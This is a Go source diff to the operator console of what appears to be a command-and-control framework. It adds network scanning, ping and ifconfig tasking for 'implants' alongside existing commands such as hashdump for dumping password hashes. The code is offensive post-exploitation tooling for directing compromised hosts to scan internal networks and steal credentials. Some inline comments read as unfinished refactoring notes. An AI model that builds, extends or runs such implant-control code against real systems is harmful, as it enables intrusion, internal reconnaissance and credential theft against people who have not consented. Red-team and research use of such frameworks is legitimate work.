@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -172,6 +173,7 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 
 	var cmdType pb.CommandMessage_CommandType
 	var cmdStr string
+	var scanOptions *pb.NetworkScanOptions
 
 	// Enhanced command handling with better feedback
 	switch command {
@@ -241,15 +243,78 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 			cmdStr = "cat " + strings.Join(args, " ")
 		}
 
+	case "scan":
+		// Parse flags
+		fs := flag.NewFlagSet("scan", flag.ContinueOnError)
+		target := fs.String("t", "", "Target IP or CIDR (required)")
+		ports := fs.String("p", "", "Comma-separated ports (default: top 20)")
+		udp := fs.Bool("u", false, "Scan UDP")
+		threads := fs.Int("threads", 10, "Number of threads")
+		timeout := fs.Int("timeout", 1000, "Timeout in ms")
+		banner := fs.Bool("b", false, "Grab banners")
+
+		// Parse args (excluding the command name 'scan')
+		if err := fs.Parse(args); err != nil {
+			return
+		}
+
+		if *target == "" {
+			fmt.Printf("%s Usage: scan -t <target> [options]\n", colorize("[*]", colorBlue))
+			fmt.Printf("   %s: scan -t 192.168.1.0/24 -p 80,443,8080 -b\n", colorize("Example", colorYellow))
+			fs.PrintDefaults()
+			return
+		}
+
+		fmt.Printf("%s Scanning target: %s\n", colorize("[*]", colorBlue), *target)
+		cmdType = pb.CommandMessage_NETWORK_SCAN
+		cmdStr = "scan"
+
+		// Parse ports
+		var portList []int32
+		if *ports != "" {
+			for _, p := range strings.Split(*ports, ",") {
+				if pInt, err := strconv.Atoi(strings.TrimSpace(p)); err == nil {
+					portList = append(portList, int32(pInt))
+				}
+			}
+		}
+
+		// Create options
+		scanOptions = &pb.NetworkScanOptions{
+			TargetRange: *target,
+			Ports:       portList,
+			ScanUdp:     *udp,
+			Threads:     int32(*threads),
+			TimeoutMs:   int32(*timeout),
+			BannerGrab:  *banner,
+		}
+
+		// We need to pass this to SendCommand, but currently it only takes CommandMessage.
+		// We need to modify the CommandMessage construction below to include these options.
+		// For now, we'll serialize it or attach it to the command struct if we modified the proto (which we did).
+
+		// Store options in a temporary variable to be used when creating the command message
+		// This requires a slight refactor of how we construct the message at the end of this function
+		// For now, we will attach it to the command message later.
+
 	case "ping":
 		if len(args) == 0 {
 			fmt.Printf("%s Usage: ping <target>\n", colorize("[*]", colorBlue))
-			fmt.Println("   Example: ping google.com")
 			return
 		}
 		fmt.Printf("%s Pinging: %s\n", colorize("[*]", colorBlue), args[0])
 		cmdType = pb.CommandMessage_NETWORK_SCAN
 		cmdStr = "ping"
+		// Ping is just a simple scan
+		scanOptions = &pb.NetworkScanOptions{
+			TargetRange: args[0],
+			Ports:       nil, // Default ports (will be handled by implant)
+			ScanUdp:     false,
+			Threads:     1,
+			TimeoutMs:   2000,
+			BannerGrab:  false,
+		}
+		// We'll use this below
 
 	case "sleep":
 		if len(args) == 0 {
@@ -280,6 +345,11 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 		fmt.Printf("%s Dumping password hashes...\n", colorize("[*]", colorBlue))
 		cmdType = pb.CommandMessage_HASHDUMP
 		cmdStr = "hashdump"
+
+	case "ifconfig":
+		fmt.Printf("%s Getting network interfaces...\n", colorize("[*]", colorBlue))
+		cmdType = pb.CommandMessage_IFCONFIG
+		cmdStr = "ifconfig"
 
 	case "module-list":
 		fmt.Printf("%s Listing available modules...\n", colorize("[*]", colorBlue))
@@ -667,12 +737,13 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 	}
 
 	cmd := &pb.CommandMessage{
-		CommandId: generateCommandID(),
-		Type:      cmdType,
-		Command:   cmdStr,
-		Args:      cmdArgs,
-		Data:      cmdData,
-		Timeout:   15, // Reduced timeout for better UX
+		CommandId:          generateCommandID(),
+		Type:               cmdType,
+		Command:            cmdStr,
+		Args:               cmdArgs,
+		Data:               cmdData,
+		Timeout:            15,          // Reduced timeout for better UX
+		NetworkScanOptions: scanOptions, // This variable needs to be defined in the scope
 	}
 
 	// Update last activity
